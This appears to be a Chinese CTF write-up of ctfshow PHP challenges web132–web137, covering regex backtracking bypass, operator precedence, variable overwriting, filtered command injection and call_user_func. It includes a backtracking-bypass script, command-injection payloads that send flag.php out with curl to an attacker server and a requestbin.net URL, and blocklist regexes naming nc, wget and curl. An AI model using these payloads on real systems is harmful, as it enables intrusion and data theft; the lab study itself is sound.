<h3 id="正则最大回溯"><a href="#正则最大回溯" class="headerlink" title="正则最大回溯"></a>正则最大回溯</h3><p>在正则匹配中往往有一定的限制，我们可以利用正则最大回溯来超过限制使得正则返回false</p>
<p>在php的扩展中提供了两个设置项</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. pcre.backtrack_limit <span class="comment">//最大回溯数</span></span><br><span class="line"><span class="number">2</span>. pcre.recursion_limit <span class="comment">//最大嵌套数</span></span><br></pre></td></tr></table></figure>

<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认的backtarck_limit是1000000(100万).</p>
<p>我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：结果返回为1000000</p>
<h4 id="非贪婪模式的详解"><a href="#非贪婪模式的详解" class="headerlink" title="非贪婪模式的详解"></a>非贪婪模式的详解</h4><p>在非贪婪模式下， 在可配可不配的情况下，优先不匹配，先将匹配控制交给正则表达式的下一个匹配字符。当之后的匹配失败的时候再回溯，进行匹配</p>
<p>举个例子</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">匹配的字符串: aaab</span></span><br><span class="line"><span class="section">正则匹配的字符: .*?b</span></span><br></pre></td></tr></table></figure>

<p>匹配过程开始的时候, “.<em>?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.</em>?”, 这个时候, “.*?”匹配一个字符”a”, 并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯.</p>
<p>利用这个原理，我们可以想到默认的backtarck_limit是十万，所以只要我们让我们的回溯次数超过十万，就会导致匹配失败而退出</p>
<h3 id="回溯上限绕过脚本"><a href="#回溯上限绕过脚本" class="headerlink" title="回溯上限绕过脚本"></a>回溯上限绕过脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://7827dca0-b812-4948-bac9-0cd382fd656e.challenge.ctf.show/&#x27;</span><span class="comment">#目标url</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_ invoke__">post</span>(url=url,data=data).text</span><br><span class="line"><span class="keyword">print</span>(r)</span><br></pre></td></tr></table></figure>

<p>因为very是四个字符，每个字符都要回溯一次，所以为了达到100万次的上限制，只需要25万个very就行，达到100万次回溯后，后面的36D再进行3次回溯，此时已经超过了限制，就会使正则返回false达到绕过</p>
<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>怎么打开是一个网站</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241115145427795.png" alt="image-20241115145427795"></p>
<p>在源码中没发现什么信息，用dirsearch扫一下目录</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241115150015507.png" alt="image-20241115150015507"></p>
<p>发现了一个&#x2F;robots.txt，应该是robots协议</p>
<p>还有一个admin，访问看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h3><p><code>mt_rand()</code> 是 PHP 中的一个随机数生成函数，用于生成伪随机整数。</p>
<p>函数语法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">mt_rand</span>(<span class="keyword">int</span> <span class="variable">$min</span> = <span class="number">0</span>, <span class="keyword">int</span> <span class="variable">$max</span> = MT_RAND_MAX);</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li><strong><code>$min</code></strong>: （可选）生成的随机数的最小值，默认为 <code>0</code>。</li>
<li><strong><code>$max</code></strong>: （可选）生成的随机数的最大值，默认为 <code>MT_RAND_MAX</code>，通常是 <code>2147483647</code>（即 PHP 中 <code>mt_rand</code> 的最大返回值）。</li>
</ul>
<p>返回值</p>
<ul>
<li>返回一个介于 <code>$min</code> 和 <code>$max</code> 之间的伪随机整数（包括 <code>$min</code> 和 <code>$max</code>）。</li>
</ul>
<p>所以这里会生成1-877之间的随机数</p>
<p>这里的三个条件通过逻辑运算符连接，不过我们应该先了解一下逻辑运算符的优先级</p>
<h3 id="逻辑运算符优先级"><a href="#逻辑运算符优先级" class="headerlink" title="逻辑运算符优先级"></a>逻辑运算符优先级</h3><ol>
<li>**<code>!</code>**（逻辑非，取反）:<ul>
<li>这是唯一的单目运算符，优先级最高。</li>
<li><code>!a</code> 表示如果 <code>a</code> 为 <code>false</code>，则结果为 <code>true</code>，反之亦然。</li>
</ul>
</li>
<li>**<code>&amp;&amp;</code>**（逻辑与）:<ul>
<li>优先级高于 <code>||</code>。</li>
<li>表达式 <code>a &amp;&amp; b</code> 只有在 <code>a</code> 和 <code>b</code> 都为 <code>true</code> 时结果为 <code>true</code>。</li>
</ul>
</li>
<li>**<code>||</code>**（逻辑或）:<ul>
<li>优先级低于 <code>&amp;&amp;</code>。</li>
<li>表达式 <code>a || b</code> 只需 <code>a</code> 或 <code>b</code> 至少有一个为 <code>true</code>，结果即为 <code>true</code>。</li>
</ul>
</li>
</ol>
<p>这里可以看到，&amp;&amp;的优先级高于||，所以里面的语句可以分成</p>
<p> if( [$code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag] || $username &#x3D;&#x3D;&#x3D;”admin”)</p>
<p>这样来看，如果前面两个条件有一个不满足，都会返回false，但在||语句中，只要有一个条件满足即可，所以只要让后面的username满足条件就可以通过if判断语句,第一个if语句满足了，第二个语句就相对容易的多了</p>
<p>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：?code=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="number">1</span>&amp;username=<span class="keyword">admin</span></span><br></pre></td></tr></table></figure>

<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>@</code> 符号</strong>:</p>
<ul>
<li>这是 PHP 的错误抑制运算符。使用 <code>@</code> 运算符可以抑制表达式中可能出现的任何错误或警告。</li>
</ul>
<p>这道题限制了参数的字符串长度，还对参数进行了一些函数的过滤</p>
<p>这里可以注意到eval函数里面有一个substr函数，说明会截取这个$F参数的前六位作为php代码去执行，但是因为这里限制了很多函数，且还有长度限制，这时候我们有一个新思路，就是通过传递参数本身实现变量覆盖</p>
<h3 id="传递参数本身实现变量覆盖"><a href="#传递参数本身实现变量覆盖" class="headerlink" title="传递参数本身实现变量覆盖"></a>传递参数本身实现变量覆盖</h3><p>解题:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先尝试：</span><br><span class="line">/?F=`$F `;sleep 3	//注意$F后有空格，这样到分号刚好6个字符</span><br><span class="line">这样传入的话可以得到eval(`$F `;)，而$F=`$F `;sleep 3</span><br><span class="line">``反引号是shell_exec()函数的缩写，以命令行形式执行命令</span><br><span class="line">这样会执行命令`$F `;也即shell_exec($F)==&gt;shell_exec(`$F `;sleep 3)</span><br><span class="line">我们就可以成功执行sleep 3了，因为是在shell里执行了，所以前面的表达式不管了，我们通过分号后的表达式来执行想要的命令</span><br><span class="line">所以这是无回显的RCE题目</span><br><span class="line">无回显我们可以用反弹shell 或者curl外带 或者盲注</span><br><span class="line">这里的话反弹没有成功，但是可以外带。</span><br></pre></td></tr></table></figure>

<p>所以这里就是实现了变量覆盖进行命令执行</p>
<p>然后我们讲一下用curl外带的方法</p>
<h3 id="curl-外带"><a href="#curl-外带" class="headerlink" title="curl 外带"></a>curl 外带</h3><p>“curl” 命令是一个在命令行下使用的工具，用于传输数据</p>
<p>curl的相关命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-F参数用来向服务器传输二进制文件，-X参数用来指定http代理</span><br></pre></td></tr></table></figure>

<p>我们需要通过curl让目标服务器向我们的服务器发送我们想要的东西，这里的服务器我们可以用burp的服务器Collaborator服务器</p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">F</span>=`$F`;+curl -X POST -F <span class="attribute">xx</span>=@flag.php  服务器地址</span><br></pre></td></tr></table></figure>

<p>对 payload 的一些解释：</p>
<p>-F 为带文件的形式发送 post 请求；</p>
<p>其中 xx 是上传文件的 name 值，我们可以自定义的，而 flag.php 就是上传的文件 ；</p>
<p><strong>相当于让服务器向 Collaborator 客户端发送 post 请求，内容是flag.php。</strong></p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118105607463-1731898571388-1.png" alt="image-20241118105607463"></p>
<p>也可以进行命令执行</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`; curl 服务器地址/`ls`</span><br></pre></td></tr></table></figure>

<p>命令的输出将被插入到 curl 命令的 URL 中 </p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118105850560.png" alt="image-20241118105850560"></p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`; curl 服务器地址/`cat flag.php|grep ctfshow`</span><br></pre></td></tr></table></figure>

<p>因为 flag.php 内容是多行，所以结合 grep 找一下。整体来说，这个命令企图读取服务器上 <code>flag.php</code> 文件中包含 <code>ctfshow</code> 的行，然后将该行的内容作为 URL 的一部分发送到指定的外部服务器。</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118110005583.png" alt="image-20241118110005583"></p>
<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果通过 GET 或 POST 请求中设置了 key1 或 key2，脚本将停止执行并输出 “nonononono”。</p>
<p>@parse_str($_SERVER[‘QUERY_STRING’]);—解析查询字符串并将变量提取到当前作用域中</p>
<p><code>extract($_POST)</code> 是将 <code>$_POST</code> 超全局变量中的键值对解压缩为对应的变量和值。</p>
<p>payload:</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST<span class="comment">[key1]</span>=36d&amp;_POST<span class="comment">[key2]</span>=36d</span><br></pre></td></tr></table></figure>

<p>由于 extract($_POST)，这两个 POST 参数会被提取为局部变量 $key1 和 $key2；解析后，会将 $_POST[‘key1’] 和 $_POST[‘key2’] 赋值为 36d；这样就能使 $key1 和 $key2 都等于 36d，从而通过最后的条件检查。</p>
<p>传参后在源码中可以找到flag</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118112218415.png" alt="image-20241118112218415"></p>
<h2 id="web135-绕过命令函数"><a href="#web135-绕过命令函数" class="headerlink" title="web135(绕过命令函数)"></a>web135(绕过命令函数)</h2><h3 id="重定向，重命名，文件复制，ping函数"><a href="#重定向，重命名，文件复制，ping函数" class="headerlink" title="#重定向，重命名，文件复制，ping函数"></a>#重定向，重命名，文件复制，ping函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了很多函数，当然curl外带也不行了</p>
<p>学习新姿势</p>
<p>我们可以看到这道题的目录是可写的，所以我们试一下新命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 重定向</span></span><br><span class="line">?F=`<span class="variable">$F</span> `;<span class="built_in">nl</span> flag.php&gt;flag</span><br><span class="line">- 将命令的输出重定向到 `1.txt` 文件中</span><br><span class="line"></span><br><span class="line">- `<span class="built_in">nl</span>` 是一个命令，用于对文件内容进行行编号。即将文件的每一行进行编号输出。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 重命名</span></span><br><span class="line">?F=`<span class="variable">$F</span> `;<span class="built_in">mv</span> flag.php 1.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">## 文件复制</span></span><br><span class="line">?F=`<span class="variable">$F</span> `;<span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">## ping</span></span><br><span class="line">?F=`<span class="variable">$F</span> `;ping <span class="built_in">cat</span> flag.php|awk <span class="string">&#x27;NR==2&#x27;</span>.服务器地址</span><br><span class="line"><span class="comment">#通过ping命令去带出数据，然后awk NR一排一排的获得数据</span></span><br><span class="line">用 awk 命令选择第 2 行（flag 在多少行是需要不断尝试出来的）；</span><br></pre></td></tr></table></figure>

<p>这里我用的cp命令，然后访问1.txt就可以看到flag了</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118113036574.png" alt="image-20241118113036574"></p>
<p>非预期</p>
<p>或者也可以用符号进行绕过</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>姿势</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cu\rl <span class="name">https</span>://requestbin.net/r/d6dln1sn?q=`ca\t flag.php | gr\ep flag1 | bas\e64`</span><br><span class="line">cu\rl <span class="name">https</span>://requestbin.net/r/d6dln1sn?q=`ca\t flag.php | gr\ep flag2 | bas\e64`</span><br></pre></td></tr></table></figure>

<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><h3 id="考察exec函数以及使用tee命令写文件"><a href="#考察exec函数以及使用tee命令写文件" class="headerlink" title="#考察exec函数以及使用tee命令写文件"></a>#考察exec函数以及使用tee命令写文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="exec-c"><a href="#exec-c" class="headerlink" title="exec($c)"></a>exec($c)</h3><p>在 PHP 中，<code>exec()</code> 函数用于执行外部程序。它可以将命令的输出捕获到一个数组变量中。</p>
<p>举个例子</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = [];</span><br><span class="line"><span class="variable">$return_var</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;ls -la&quot;</span>;  <span class="regexp">//</span> 这是一个简单的命令例子</span><br><span class="line">exec(<span class="variable">$c</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="variable">$output</span> 会包含命令的输出</span><br><span class="line"><span class="regexp">//</span> <span class="variable">$return_var</span> 会包含命令的返回状态码</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>参数</strong>：<ul>
<li><code>$c</code>：要执行的命令。</li>
<li><code>$output</code>：这是一个可选参数，用于捕获命令输出。</li>
<li><code>$return_var</code>：这是一个可选参数，用于捕获命令的返回状态码。</li>
</ul>
</li>
</ul>
<p>其实我没怎么遇到过这个 exec 函数，尝试执行命令，发现页面是空白的</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115336240.png" alt="image-20241118115336240"></p>
<p>这时候我们就得想到关于exec的用法了，我们需要将结果重定向到某个文件，然后再访问对应的文件</p>
<p>因为&gt;过滤，使用tee命令，可以变为另一个文件，类似&gt;</p>
<p>payload：</p>
<p>?c&#x3D;ls|tee 1 然后访问1发现只有一个index.php</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115831974.png" alt="image-20241118115831974"></p>
<p>?c&#x3D;ls &#x2F;|tee 1 访问1下载查看文件</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118115858748.png" alt="image-20241118115858748"></p>
<p> ?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1 访问下载查看文件1(2)就可以拿到flag了</p>
<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><h3 id="考察call-user-func-函数的使用"><a href="#考察call-user-func-函数的使用" class="headerlink" title="#考察call_user_func()函数的使用"></a>#考察call_user_func()函数的使用</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="call-user-func函数"><a href="#call-user-func函数" class="headerlink" title="call_user_func函数"></a>call_user_func函数</h3><p>call_user_func()用于调用用户定义的函数</p>
<p>基本用法：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = call_user_func(<span class="string">&#x27;function_name&#x27;</span>, $arg1, $arg2, <span class="params">...</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>function_name</code>**：这是你想要调用的函数的名称，可以是字符串形式的函数名，也可以是匿名函数或其他可调用的结构。</li>
<li>**<code>$arg1, $arg2, ...</code>**：这是要传递给函数的参数，数量可变。</li>
</ul>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span>(<span class="params"><span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$type</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&#x27;wanth3f1ag&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;wanth3f1ag&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;barber&#x27;</span>,<span class="variable">$a</span> );</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">///wanth3f1ag</span></span><br><span class="line"><span class="comment">///wanth3f1ag</span></span><br></pre></td></tr></table></figure>

<p>那这里的话我们可以看到ctfsow类里面有跟flag有关的方法，所以我们需要调用类里面的方法</p>
<h4 id="第一个方法-调用类里面的方法"><a href="#第一个方法-调用类里面的方法" class="headerlink" title="第一个方法:调用类里面的方法"></a>第一个方法:调用类里面的方法</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">payload:</span><span class="attr">ctfshow</span><span class="operator">=</span>ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p>双冒号可以不经过实例化调用类的方法</p>
<p>或者也可以使用数组的方法进行调用</p>
<h4 id="第二个方法：数组方式调用"><a href="#第二个方法：数组方式调用" class="headerlink" title="第二个方法：数组方式调用"></a>第二个方法：数组方式调用</h4><p>举个例子</p>
